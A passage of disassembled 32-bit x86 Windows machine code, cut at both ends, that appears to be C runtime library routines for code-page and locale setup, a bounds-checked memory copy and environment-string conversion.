  4063e4:	8d 8d ee f8 ff ff    	lea    -0x712(%ebp),%ecx
  4063ea:	c6 85 fc fe ff ff 20 	movb   $0x20,-0x104(%ebp)
  4063f1:	eb 1f                	jmp    0x406412
  4063f3:	0f b6 51 01          	movzbl 0x1(%ecx),%edx
  4063f7:	0f b6 c0             	movzbl %al,%eax
  4063fa:	eb 0d                	jmp    0x406409
  4063fc:	3b c7                	cmp    %edi,%eax
  4063fe:	73 0d                	jae    0x40640d
  406400:	c6 84 05 fc fe ff ff 	movb   $0x20,-0x104(%ebp,%eax,1)
  406407:	20 
  406408:	40                   	inc    %eax
  406409:	3b c2                	cmp    %edx,%eax
  40640b:	76 ef                	jbe    0x4063fc
  40640d:	83 c1 02             	add    $0x2,%ecx
  406410:	8a 01                	mov    (%ecx),%al
  406412:	84 c0                	test   %al,%al
  406414:	75 dd                	jne    0x4063f3
  406416:	53                   	push   %ebx
  406417:	ff 76 04             	push   0x4(%esi)
  40641a:	8d 85 fc f8 ff ff    	lea    -0x704(%ebp),%eax
  406420:	50                   	push   %eax
  406421:	57                   	push   %edi
  406422:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  406428:	50                   	push   %eax
  406429:	6a 01                	push   $0x1
  40642b:	53                   	push   %ebx
  40642c:	e8 1c 13 00 00       	call   0x40774d
  406431:	53                   	push   %ebx
  406432:	ff 76 04             	push   0x4(%esi)
  406435:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40643b:	57                   	push   %edi
  40643c:	50                   	push   %eax
  40643d:	57                   	push   %edi
  40643e:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  406444:	50                   	push   %eax
  406445:	57                   	push   %edi
  406446:	ff b6 1c 02 00 00    	push   0x21c(%esi)
  40644c:	53                   	push   %ebx
  40644d:	e8 7f 2c 00 00       	call   0x4090d1
  406452:	83 c4 40             	add    $0x40,%esp
  406455:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  40645b:	53                   	push   %ebx
  40645c:	ff 76 04             	push   0x4(%esi)
  40645f:	57                   	push   %edi
  406460:	50                   	push   %eax
  406461:	57                   	push   %edi
  406462:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  406468:	50                   	push   %eax
  406469:	68 00 02 00 00       	push   $0x200
  40646e:	ff b6 1c 02 00 00    	push   0x21c(%esi)
  406474:	53                   	push   %ebx
  406475:	e8 57 2c 00 00       	call   0x4090d1
  40647a:	83 c4 24             	add    $0x24,%esp
  40647d:	8b cb                	mov    %ebx,%ecx
  40647f:	0f b7 84 4d fc f8 ff 	movzwl -0x704(%ebp,%ecx,2),%eax
  406486:	ff 
  406487:	a8 01                	test   $0x1,%al
  406489:	74 0e                	je     0x406499
  40648b:	80 4c 0e 19 10       	orb    $0x10,0x19(%esi,%ecx,1)
  406490:	8a 84 0d fc fd ff ff 	mov    -0x204(%ebp,%ecx,1),%al
  406497:	eb 10                	jmp    0x4064a9
  406499:	a8 02                	test   $0x2,%al
  40649b:	74 15                	je     0x4064b2
  40649d:	80 4c 0e 19 20       	orb    $0x20,0x19(%esi,%ecx,1)
  4064a2:	8a 84 0d fc fc ff ff 	mov    -0x304(%ebp,%ecx,1),%al
  4064a9:	88 84 0e 19 01 00 00 	mov    %al,0x119(%esi,%ecx,1)
  4064b0:	eb 07                	jmp    0x4064b9
  4064b2:	88 9c 0e 19 01 00 00 	mov    %bl,0x119(%esi,%ecx,1)
  4064b9:	41                   	inc    %ecx
  4064ba:	3b cf                	cmp    %edi,%ecx
  4064bc:	72 c1                	jb     0x40647f
  4064be:	eb 59                	jmp    0x406519
  4064c0:	6a 9f                	push   $0xffffff9f
  4064c2:	8d 96 19 01 00 00    	lea    0x119(%esi),%edx
  4064c8:	8b cb                	mov    %ebx,%ecx
  4064ca:	58                   	pop    %eax
  4064cb:	2b c2                	sub    %edx,%eax
  4064cd:	89 85 e0 f8 ff ff    	mov    %eax,-0x720(%ebp)
  4064d3:	03 d1                	add    %ecx,%edx
  4064d5:	03 c2                	add    %edx,%eax
  4064d7:	89 85 e4 f8 ff ff    	mov    %eax,-0x71c(%ebp)
  4064dd:	83 c0 20             	add    $0x20,%eax
  4064e0:	83 f8 19             	cmp    $0x19,%eax
  4064e3:	77 0a                	ja     0x4064ef
  4064e5:	80 4c 0e 19 10       	orb    $0x10,0x19(%esi,%ecx,1)
  4064ea:	8d 41 20             	lea    0x20(%ecx),%eax
  4064ed:	eb 13                	jmp    0x406502
  4064ef:	83 bd e4 f8 ff ff 19 	cmpl   $0x19,-0x71c(%ebp)
  4064f6:	77 0e                	ja     0x406506
  4064f8:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  4064fb:	80 48 19 20          	orb    $0x20,0x19(%eax)
  4064ff:	8d 41 e0             	lea    -0x20(%ecx),%eax
  406502:	88 02                	mov    %al,(%edx)
  406504:	eb 02                	jmp    0x406508
  406506:	88 1a                	mov    %bl,(%edx)
  406508:	8b 85 e0 f8 ff ff    	mov    -0x720(%ebp),%eax
  40650e:	8d 96 19 01 00 00    	lea    0x119(%esi),%edx
  406514:	41                   	inc    %ecx
  406515:	3b cf                	cmp    %edi,%ecx
  406517:	72 ba                	jb     0x4064d3
  406519:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40651c:	5f                   	pop    %edi
  40651d:	5e                   	pop    %esi
  40651e:	33 cd                	xor    %ebp,%ecx
  406520:	5b                   	pop    %ebx
  406521:	e8 38 ad ff ff       	call   0x40125e
  406526:	8b e5                	mov    %ebp,%esp
  406528:	5d                   	pop    %ebp
  406529:	c3                   	ret
  40652a:	8b ff                	mov    %edi,%edi
  40652c:	55                   	push   %ebp
  40652d:	8b ec                	mov    %esp,%ebp
  40652f:	83 ec 0c             	sub    $0xc,%esp
  406532:	e8 ed f2 ff ff       	call   0x405824
  406537:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40653a:	e8 0a 01 00 00       	call   0x406649
  40653f:	ff 75 08             	push   0x8(%ebp)
  406542:	e8 77 fd ff ff       	call   0x4062be
  406547:	59                   	pop    %ecx
  406548:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40654b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40654e:	8b 49 48             	mov    0x48(%ecx),%ecx
  406551:	3b 41 04             	cmp    0x4(%ecx),%eax
  406554:	75 04                	jne    0x40655a
  406556:	33 c0                	xor    %eax,%eax
  406558:	eb 53                	jmp    0x4065ad
  40655a:	53                   	push   %ebx
  40655b:	56                   	push   %esi
  40655c:	57                   	push   %edi
  40655d:	68 20 02 00 00       	push   $0x220
  406562:	e8 98 11 00 00       	call   0x4076ff
  406567:	8b f8                	mov    %eax,%edi
  406569:	83 cb ff             	or     $0xffffffff,%ebx
  40656c:	59                   	pop    %ecx
  40656d:	85 ff                	test   %edi,%edi
  40656f:	74 2e                	je     0x40659f
  406571:	8b 75 fc             	mov    -0x4(%ebp),%esi
  406574:	b9 88 00 00 00       	mov    $0x88,%ecx
  406579:	8b 76 48             	mov    0x48(%esi),%esi
  40657c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40657e:	8b f8                	mov    %eax,%edi
  406580:	57                   	push   %edi
  406581:	ff 75 f4             	push   -0xc(%ebp)
  406584:	83 27 00             	andl   $0x0,(%edi)
  406587:	e8 5f 01 00 00       	call   0x4066eb
  40658c:	8b f0                	mov    %eax,%esi
  40658e:	59                   	pop    %ecx
  40658f:	59                   	pop    %ecx
  406590:	3b f3                	cmp    %ebx,%esi
  406592:	75 1d                	jne    0x4065b1
  406594:	e8 60 f6 ff ff       	call   0x405bf9
  406599:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40659f:	8b f3                	mov    %ebx,%esi
  4065a1:	57                   	push   %edi
  4065a2:	e8 c2 f6 ff ff       	call   0x405c69
  4065a7:	59                   	pop    %ecx
  4065a8:	5f                   	pop    %edi
  4065a9:	8b c6                	mov    %esi,%eax
  4065ab:	5e                   	pop    %esi
  4065ac:	5b                   	pop    %ebx
  4065ad:	8b e5                	mov    %ebp,%esp
  4065af:	5d                   	pop    %ebp
  4065b0:	c3                   	ret
  4065b1:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  4065b5:	75 05                	jne    0x4065bc
  4065b7:	e8 78 e6 ff ff       	call   0x404c34
  4065bc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065bf:	8b 40 48             	mov    0x48(%eax),%eax
  4065c2:	f0 0f c1 18          	lock xadd %ebx,(%eax)
  4065c6:	4b                   	dec    %ebx
  4065c7:	75 15                	jne    0x4065de
  4065c9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065cc:	81 78 48 58 43 41 00 	cmpl   $0x414358,0x48(%eax)
  4065d3:	74 09                	je     0x4065de
  4065d5:	ff 70 48             	push   0x48(%eax)
  4065d8:	e8 8c f6 ff ff       	call   0x405c69
  4065dd:	59                   	pop    %ecx
  4065de:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  4065e4:	8b cf                	mov    %edi,%ecx
  4065e6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065e9:	33 ff                	xor    %edi,%edi
  4065eb:	89 48 48             	mov    %ecx,0x48(%eax)
  4065ee:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065f1:	f6 80 50 03 00 00 02 	testb  $0x2,0x350(%eax)
  4065f8:	75 a7                	jne    0x4065a1
  4065fa:	f6 05 a0 46 41 00 01 	testb  $0x1,0x4146a0
  406601:	75 9e                	jne    0x4065a1
  406603:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406606:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406609:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40660c:	50                   	push   %eax
  40660d:	6a 05                	push   $0x5
  40660f:	e8 80 fb ff ff       	call   0x406194
  406614:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  406618:	59                   	pop    %ecx
  406619:	59                   	pop    %ecx
  40661a:	74 85                	je     0x4065a1
  40661c:	a1 78 45 41 00       	mov    0x414578,%eax
  406621:	a3 3c 46 41 00       	mov    %eax,0x41463c
  406626:	e9 76 ff ff ff       	jmp    0x4065a1
  40662b:	80 3d 5c 4d 41 00 00 	cmpb   $0x0,0x414d5c
  406632:	75 12                	jne    0x406646
  406634:	6a 01                	push   $0x1
  406636:	6a fd                	push   $0xfffffffd
  406638:	e8 ed fe ff ff       	call   0x40652a
  40663d:	59                   	pop    %ecx
  40663e:	59                   	pop    %ecx
  40663f:	c6 05 5c 4d 41 00 01 	movb   $0x1,0x414d5c
  406646:	b0 01                	mov    $0x1,%al
  406648:	c3                   	ret
  406649:	6a 0c                	push   $0xc
  40664b:	68 c0 27 41 00       	push   $0x4127c0
  406650:	e8 4b b5 ff ff       	call   0x401ba0
  406655:	33 f6                	xor    %esi,%esi
  406657:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40665a:	e8 c5 f1 ff ff       	call   0x405824
  40665f:	8b f8                	mov    %eax,%edi
  406661:	8b 0d a0 46 41 00    	mov    0x4146a0,%ecx
  406667:	85 8f 50 03 00 00    	test   %ecx,0x350(%edi)
  40666d:	74 11                	je     0x406680
  40666f:	39 77 4c             	cmp    %esi,0x4c(%edi)
  406672:	74 0c                	je     0x406680
  406674:	8b 77 48             	mov    0x48(%edi),%esi
  406677:	85 f6                	test   %esi,%esi
  406679:	75 68                	jne    0x4066e3
  40667b:	e8 45 ec ff ff       	call   0x4052c5
  406680:	6a 05                	push   $0x5
  406682:	e8 5b 04 00 00       	call   0x406ae2
  406687:	59                   	pop    %ecx
  406688:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40668b:	8b 77 48             	mov    0x48(%edi),%esi
  40668e:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  406691:	3b 35 78 45 41 00    	cmp    0x414578,%esi
  406697:	74 30                	je     0x4066c9
  406699:	85 f6                	test   %esi,%esi
  40669b:	74 18                	je     0x4066b5
  40669d:	83 c8 ff             	or     $0xffffffff,%eax
  4066a0:	f0 0f c1 06          	lock xadd %eax,(%esi)
  4066a4:	75 0f                	jne    0x4066b5
  4066a6:	81 fe 58 43 41 00    	cmp    $0x414358,%esi
  4066ac:	74 07                	je     0x4066b5
  4066ae:	56                   	push   %esi
  4066af:	e8 b5 f5 ff ff       	call   0x405c69
  4066b4:	59                   	pop    %ecx
  4066b5:	a1 78 45 41 00       	mov    0x414578,%eax
  4066ba:	89 47 48             	mov    %eax,0x48(%edi)
  4066bd:	8b 35 78 45 41 00    	mov    0x414578,%esi
  4066c3:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4066c6:	f0 ff 06             	lock incl (%esi)
  4066c9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4066d0:	e8 05 00 00 00       	call   0x4066da
  4066d5:	eb a0                	jmp    0x406677
  4066d7:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4066da:	6a 05                	push   $0x5
  4066dc:	e8 49 04 00 00       	call   0x406b2a
  4066e1:	59                   	pop    %ecx
  4066e2:	c3                   	ret
  4066e3:	8b c6                	mov    %esi,%eax
  4066e5:	e8 06 b5 ff ff       	call   0x401bf0
  4066ea:	c3                   	ret
  4066eb:	8b ff                	mov    %edi,%edi
  4066ed:	55                   	push   %ebp
  4066ee:	8b ec                	mov    %esp,%ebp
  4066f0:	83 ec 20             	sub    $0x20,%esp
  4066f3:	a1 00 40 41 00       	mov    0x414000,%eax
  4066f8:	33 c5                	xor    %ebp,%eax
  4066fa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4066fd:	53                   	push   %ebx
  4066fe:	56                   	push   %esi
  4066ff:	ff 75 08             	push   0x8(%ebp)
  406702:	8b 75 0c             	mov    0xc(%ebp),%esi
  406705:	e8 b4 fb ff ff       	call   0x4062be
  40670a:	8b d8                	mov    %eax,%ebx
  40670c:	59                   	pop    %ecx
  40670d:	85 db                	test   %ebx,%ebx
  40670f:	75 0e                	jne    0x40671f
  406711:	56                   	push   %esi
  406712:	e8 1a fc ff ff       	call   0x406331
  406717:	59                   	pop    %ecx
  406718:	33 c0                	xor    %eax,%eax
  40671a:	e9 ad 01 00 00       	jmp    0x4068cc
  40671f:	57                   	push   %edi
  406720:	33 ff                	xor    %edi,%edi
  406722:	8b cf                	mov    %edi,%ecx
  406724:	8b c7                	mov    %edi,%eax
  406726:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  406729:	39 98 60 40 41 00    	cmp    %ebx,0x414060(%eax)
  40672f:	0f 84 ea 00 00 00    	je     0x40681f
  406735:	41                   	inc    %ecx
  406736:	83 c0 30             	add    $0x30,%eax
  406739:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40673c:	3d f0 00 00 00       	cmp    $0xf0,%eax
  406741:	72 e6                	jb     0x406729
  406743:	81 fb e8 fd 00 00    	cmp    $0xfde8,%ebx
  406749:	0f 84 c8 00 00 00    	je     0x406817
  40674f:	81 fb e9 fd 00 00    	cmp    $0xfde9,%ebx
  406755:	0f 84 bc 00 00 00    	je     0x406817
  40675b:	0f b7 c3             	movzwl %bx,%eax
  40675e:	50                   	push   %eax
  40675f:	ff 15 e4 d0 40 00    	call   *0x40d0e4
  406765:	85 c0                	test   %eax,%eax
  406767:	0f 84 aa 00 00 00    	je     0x406817
  40676d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406770:	50                   	push   %eax
  406771:	53                   	push   %ebx
  406772:	ff 15 ec d0 40 00    	call   *0x40d0ec
  406778:	85 c0                	test   %eax,%eax
  40677a:	0f 84 84 00 00 00    	je     0x406804
  406780:	68 01 01 00 00       	push   $0x101
  406785:	8d 46 18             	lea    0x18(%esi),%eax
  406788:	57                   	push   %edi
  406789:	50                   	push   %eax
  40678a:	e8 e1 bd ff ff       	call   0x402570
  40678f:	89 5e 04             	mov    %ebx,0x4(%esi)
  406792:	83 c4 0c             	add    $0xc,%esp
  406795:	33 db                	xor    %ebx,%ebx
  406797:	89 be 1c 02 00 00    	mov    %edi,0x21c(%esi)
  40679d:	43                   	inc    %ebx
  40679e:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4067a1:	76 51                	jbe    0x4067f4
  4067a3:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  4067a7:	8d 45 ee             	lea    -0x12(%ebp),%eax
  4067aa:	74 21                	je     0x4067cd
  4067ac:	8a 48 01             	mov    0x1(%eax),%cl
  4067af:	84 c9                	test   %cl,%cl
  4067b1:	74 1a                	je     0x4067cd
  4067b3:	0f b6 d1             	movzbl %cl,%edx
  4067b6:	0f b6 08             	movzbl (%eax),%ecx
  4067b9:	eb 06                	jmp    0x4067c1
  4067bb:	80 4c 0e 19 04       	orb    $0x4,0x19(%esi,%ecx,1)
  4067c0:	41                   	inc    %ecx
  4067c1:	3b ca                	cmp    %edx,%ecx
  4067c3:	76 f6                	jbe    0x4067bb
  4067c5:	83 c0 02             	add    $0x2,%eax
  4067c8:	80 38 00             	cmpb   $0x0,(%eax)
  4067cb:	75 df                	jne    0x4067ac
  4067cd:	8d 46 1a             	lea    0x1a(%esi),%eax
  4067d0:	b9 fe 00 00 00       	mov    $0xfe,%ecx
  4067d5:	80 08 08             	orb    $0x8,(%eax)
  4067d8:	40                   	inc    %eax
  4067d9:	83 e9 01             	sub    $0x1,%ecx
  4067dc:	75 f7                	jne    0x4067d5
  4067de:	ff 76 04             	push   0x4(%esi)
  4067e1:	e8 9a fa ff ff       	call   0x406280
  4067e6:	83 c4 04             	add    $0x4,%esp
  4067e9:	89 86 1c 02 00 00    	mov    %eax,0x21c(%esi)
  4067ef:	89 5e 08             	mov    %ebx,0x8(%esi)
  4067f2:	eb 03                	jmp    0x4067f7
  4067f4:	89 7e 08             	mov    %edi,0x8(%esi)
  4067f7:	33 c0                	xor    %eax,%eax
  4067f9:	8d 7e 0c             	lea    0xc(%esi),%edi
  4067fc:	ab                   	stos   %eax,%es:(%edi)
  4067fd:	ab                   	stos   %eax,%es:(%edi)
  4067fe:	ab                   	stos   %eax,%es:(%edi)
  4067ff:	e9 be 00 00 00       	jmp    0x4068c2
  406804:	39 3d 58 4d 41 00    	cmp    %edi,0x414d58
  40680a:	74 0b                	je     0x406817
  40680c:	56                   	push   %esi
  40680d:	e8 1f fb ff ff       	call   0x406331
  406812:	e9 b1 00 00 00       	jmp    0x4068c8
  406817:	83 c8 ff             	or     $0xffffffff,%eax
  40681a:	e9 ac 00 00 00       	jmp    0x4068cb
  40681f:	68 01 01 00 00       	push   $0x101
  406824:	8d 46 18             	lea    0x18(%esi),%eax
  406827:	57                   	push   %edi
  406828:	50                   	push   %eax
  406829:	e8 42 bd ff ff       	call   0x402570
  40682e:	83 c4 0c             	add    $0xc,%esp
  406831:	6b 45 e4 30          	imul   $0x30,-0x1c(%ebp),%eax
  406835:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406838:	8d 80 70 40 41 00    	lea    0x414070(%eax),%eax
  40683e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406841:	80 38 00             	cmpb   $0x0,(%eax)
  406844:	8b c8                	mov    %eax,%ecx
  406846:	74 35                	je     0x40687d
  406848:	8a 41 01             	mov    0x1(%ecx),%al
  40684b:	84 c0                	test   %al,%al
  40684d:	74 2b                	je     0x40687a
  40684f:	0f b6 11             	movzbl (%ecx),%edx
  406852:	0f b6 c0             	movzbl %al,%eax
  406855:	eb 17                	jmp    0x40686e
  406857:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  40685d:	73 13                	jae    0x406872
  40685f:	8a 87 5c 40 41 00    	mov    0x41405c(%edi),%al
  406865:	08 44 16 19          	or     %al,0x19(%esi,%edx,1)
  406869:	42                   	inc    %edx
  40686a:	0f b6 41 01          	movzbl 0x1(%ecx),%eax
  40686e:	3b d0                	cmp    %eax,%edx
  406870:	76 e5                	jbe    0x406857
  406872:	83 c1 02             	add    $0x2,%ecx
  406875:	80 39 00             	cmpb   $0x0,(%ecx)
  406878:	75 ce                	jne    0x406848
  40687a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40687d:	47                   	inc    %edi
  40687e:	83 c0 08             	add    $0x8,%eax
  406881:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406884:	83 ff 04             	cmp    $0x4,%edi
  406887:	72 b8                	jb     0x406841
  406889:	53                   	push   %ebx
  40688a:	89 5e 04             	mov    %ebx,0x4(%esi)
  40688d:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  406894:	e8 e7 f9 ff ff       	call   0x406280
  406899:	83 c4 04             	add    $0x4,%esp
  40689c:	89 86 1c 02 00 00    	mov    %eax,0x21c(%esi)
  4068a2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4068a5:	8d 4e 0c             	lea    0xc(%esi),%ecx
  4068a8:	6a 06                	push   $0x6
  4068aa:	8d 90 64 40 41 00    	lea    0x414064(%eax),%edx
  4068b0:	5f                   	pop    %edi
  4068b1:	66 8b 02             	mov    (%edx),%ax
  4068b4:	8d 52 02             	lea    0x2(%edx),%edx
  4068b7:	66 89 01             	mov    %ax,(%ecx)
  4068ba:	8d 49 02             	lea    0x2(%ecx),%ecx
  4068bd:	83 ef 01             	sub    $0x1,%edi
  4068c0:	75 ef                	jne    0x4068b1
  4068c2:	56                   	push   %esi
  4068c3:	e8 ce fa ff ff       	call   0x406396
  4068c8:	59                   	pop    %ecx
  4068c9:	33 c0                	xor    %eax,%eax
  4068cb:	5f                   	pop    %edi
  4068cc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4068cf:	5e                   	pop    %esi
  4068d0:	33 cd                	xor    %ebp,%ecx
  4068d2:	5b                   	pop    %ebx
  4068d3:	e8 86 a9 ff ff       	call   0x40125e
  4068d8:	8b e5                	mov    %ebp,%esp
  4068da:	5d                   	pop    %ebp
  4068db:	c3                   	ret
  4068dc:	8b ff                	mov    %edi,%edi
  4068de:	55                   	push   %ebp
  4068df:	8b ec                	mov    %esp,%ebp
  4068e1:	56                   	push   %esi
  4068e2:	8b 75 14             	mov    0x14(%ebp),%esi
  4068e5:	85 f6                	test   %esi,%esi
  4068e7:	75 04                	jne    0x4068ed
  4068e9:	33 c0                	xor    %eax,%eax
  4068eb:	eb 6d                	jmp    0x40695a
  4068ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4068f0:	85 c0                	test   %eax,%eax
  4068f2:	75 13                	jne    0x406907
  4068f4:	e8 00 f3 ff ff       	call   0x405bf9
  4068f9:	6a 16                	push   $0x16
  4068fb:	5e                   	pop    %esi
  4068fc:	89 30                	mov    %esi,(%eax)
  4068fe:	e8 3a f2 ff ff       	call   0x405b3d
  406903:	8b c6                	mov    %esi,%eax
  406905:	eb 53                	jmp    0x40695a
  406907:	57                   	push   %edi
  406908:	8b 7d 10             	mov    0x10(%ebp),%edi
  40690b:	85 ff                	test   %edi,%edi
  40690d:	74 14                	je     0x406923
  40690f:	39 75 0c             	cmp    %esi,0xc(%ebp)
  406912:	72 0f                	jb     0x406923
  406914:	56                   	push   %esi
  406915:	57                   	push   %edi
  406916:	50                   	push   %eax
  406917:	e8 14 d2 ff ff       	call   0x403b30
  40691c:	83 c4 0c             	add    $0xc,%esp
  40691f:	33 c0                	xor    %eax,%eax
  406921:	eb 36                	jmp    0x406959
  406923:	ff 75 0c             	push   0xc(%ebp)
  406926:	6a 00                	push   $0x0
  406928:	50                   	push   %eax
  406929:	e8 42 bc ff ff       	call   0x402570
  40692e:	83 c4 0c             	add    $0xc,%esp
  406931:	85 ff                	test   %edi,%edi
  406933:	75 09                	jne    0x40693e
  406935:	e8 bf f2 ff ff       	call   0x405bf9
  40693a:	6a 16                	push   $0x16
  40693c:	eb 0c                	jmp    0x40694a
  40693e:	39 75 0c             	cmp    %esi,0xc(%ebp)
  406941:	73 13                	jae    0x406956
  406943:	e8 b1 f2 ff ff       	call   0x405bf9
  406948:	6a 22                	push   $0x22
  40694a:	5e                   	pop    %esi
  40694b:	89 30                	mov    %esi,(%eax)
  40694d:	e8 eb f1 ff ff       	call   0x405b3d
  406952:	8b c6                	mov    %esi,%eax
  406954:	eb 03                	jmp    0x406959
  406956:	6a 16                	push   $0x16
  406958:	58                   	pop    %eax
  406959:	5f                   	pop    %edi
  40695a:	5e                   	pop    %esi
  40695b:	5d                   	pop    %ebp
  40695c:	c3                   	ret
  40695d:	8b ff                	mov    %edi,%edi
  40695f:	55                   	push   %ebp
  406960:	8b ec                	mov    %esp,%ebp
  406962:	83 ec 10             	sub    $0x10,%esp
  406965:	56                   	push   %esi
  406966:	ff 75 08             	push   0x8(%ebp)
  406969:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40696c:	e8 0c ea ff ff       	call   0x40537d
  406971:	0f b6 75 0c          	movzbl 0xc(%ebp),%esi
  406975:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406978:	8a 4d 14             	mov    0x14(%ebp),%cl
  40697b:	84 4c 30 19          	test   %cl,0x19(%eax,%esi,1)
  40697f:	75 1b                	jne    0x40699c
  406981:	33 d2                	xor    %edx,%edx
  406983:	39 55 10             	cmp    %edx,0x10(%ebp)
  406986:	74 0e                	je     0x406996
  406988:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40698b:	8b 00                	mov    (%eax),%eax
  40698d:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
  406991:	23 45 10             	and    0x10(%ebp),%eax
  406994:	eb 02                	jmp    0x406998
  406996:	8b c2                	mov    %edx,%eax
  406998:	85 c0                	test   %eax,%eax
  40699a:	74 03                	je     0x40699f
  40699c:	33 d2                	xor    %edx,%edx
  40699e:	42                   	inc    %edx
  40699f:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  4069a3:	5e                   	pop    %esi
  4069a4:	74 0a                	je     0x4069b0
  4069a6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4069a9:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  4069b0:	8b c2                	mov    %edx,%eax
  4069b2:	8b e5                	mov    %ebp,%esp
  4069b4:	5d                   	pop    %ebp
  4069b5:	c3                   	ret
  4069b6:	8b ff                	mov    %edi,%edi
  4069b8:	55                   	push   %ebp
  4069b9:	8b ec                	mov    %esp,%ebp
  4069bb:	6a 04                	push   $0x4
  4069bd:	6a 00                	push   $0x0
  4069bf:	ff 75 08             	push   0x8(%ebp)
  4069c2:	6a 00                	push   $0x0
  4069c4:	e8 94 ff ff ff       	call   0x40695d
  4069c9:	83 c4 10             	add    $0x10,%esp
  4069cc:	5d                   	pop    %ebp
  4069cd:	c3                   	ret
  4069ce:	ff 15 f0 d0 40 00    	call   *0x40d0f0
  4069d4:	a3 6c 4d 41 00       	mov    %eax,0x414d6c
  4069d9:	ff 15 f4 d0 40 00    	call   *0x40d0f4
  4069df:	a3 70 4d 41 00       	mov    %eax,0x414d70
  4069e4:	b0 01                	mov    $0x1,%al
  4069e6:	c3                   	ret
  4069e7:	8b ff                	mov    %edi,%edi
  4069e9:	55                   	push   %ebp
  4069ea:	8b ec                	mov    %esp,%ebp
  4069ec:	8b 55 08             	mov    0x8(%ebp),%edx
  4069ef:	57                   	push   %edi
  4069f0:	33 ff                	xor    %edi,%edi
  4069f2:	66 39 3a             	cmp    %di,(%edx)
  4069f5:	74 21                	je     0x406a18
  4069f7:	56                   	push   %esi
  4069f8:	8b ca                	mov    %edx,%ecx
  4069fa:	8d 71 02             	lea    0x2(%ecx),%esi
  4069fd:	66 8b 01             	mov    (%ecx),%ax
  406a00:	83 c1 02             	add    $0x2,%ecx
  406a03:	66 3b c7             	cmp    %di,%ax
  406a06:	75 f5                	jne    0x4069fd
  406a08:	2b ce                	sub    %esi,%ecx
  406a0a:	d1 f9                	sar    $1,%ecx
  406a0c:	8d 14 4a             	lea    (%edx,%ecx,2),%edx
  406a0f:	83 c2 02             	add    $0x2,%edx
  406a12:	66 39 3a             	cmp    %di,(%edx)
  406a15:	75 e1                	jne    0x4069f8
  406a17:	5e                   	pop    %esi
  406a18:	8d 42 02             	lea    0x2(%edx),%eax
  406a1b:	5f                   	pop    %edi
  406a1c:	5d                   	pop    %ebp
  406a1d:	c3                   	ret
  406a1e:	8b ff                	mov    %edi,%edi
  406a20:	55                   	push   %ebp
  406a21:	8b ec                	mov    %esp,%ebp
  406a23:	51                   	push   %ecx
  406a24:	53                   	push   %ebx
  406a25:	56                   	push   %esi
  406a26:	57                   	push   %edi
  406a27:	ff 15 f8 d0 40 00    	call   *0x40d0f8
  406a2d:	8b f0                	mov    %eax,%esi
  406a2f:	33 ff                	xor    %edi,%edi
  406a31:	85 f6                	test   %esi,%esi
  406a33:	74 56                	je     0x406a8b
  406a35:	56                   	push   %esi
  406a36:	e8 ac ff ff ff       	call   0x4069e7
  406a3b:	59                   	pop    %ecx
  406a3c:	57                   	push   %edi
  406a3d:	57                   	push   %edi
  406a3e:	57                   	push   %edi
  406a3f:	8b d8                	mov    %eax,%ebx
  406a41:	57                   	push   %edi
  406a42:	2b de                	sub    %esi,%ebx
  406a44:	d1 fb                	sar    $1,%ebx
  406a46:	53                   	push   %ebx
  406a47:	56                   	push   %esi
  406a48:	57                   	push   %edi
  406a49:	57                   	push   %edi
  406a4a:	ff 15 bc d0 40 00    	call   *0x40d0bc
  406a50:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406a53:	85 c0                	test   %eax,%eax
  406a55:	74 34                	je     0x406a8b
  406a57:	50                   	push   %eax
  406a58:	e8 a2 0c 00 00       	call   0x4076ff
  406a5d:	8b f8                	mov    %eax,%edi
  406a5f:	59                   	pop    %ecx
  406a60:	85 ff                	test   %edi,%edi
  406a62:	74 1c                	je     0x406a80
  406a64:	33 c0                	xor    %eax,%eax
